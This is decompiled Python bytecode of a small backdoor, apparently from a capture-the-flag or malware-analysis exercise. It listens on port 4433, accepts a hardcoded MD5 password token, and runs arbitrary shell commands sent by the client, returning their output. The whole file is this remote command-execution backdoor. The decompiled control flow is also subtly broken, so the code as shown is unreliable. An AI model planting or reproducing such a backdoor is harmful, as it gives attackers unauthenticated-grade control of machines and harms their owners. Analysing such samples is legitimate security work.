# decompyle3 version 3.3.2
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.9.1 (default, Dec  8 2020, 07:51:42) 
# [GCC 10.2.0]
# Embedded file name: bd.py
import socket
from hashlib import md5
from subprocess import check_output
sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', 4433))
sock.listen(5)
while True:
    while True:
        client, addr = sock.accept()
        data = client.recv(32)
        if len(data) != 32:
            client.close()

    if data.decode() != md5('s4v3_th3_w0rld').hexdigest():
        client.send('Invalid')
        client.close()
    else:
        size = client.recv(1)
        command = client.recv(int.from_bytes(size, 'little'))
        if not command.startswith('command:'):
            client.close()
        else:
            command = command.replace('command:', '')
            output = check_output(command, shell=True)
            client.send(output)
            client.close()
# okay decompiling bd2.pyc
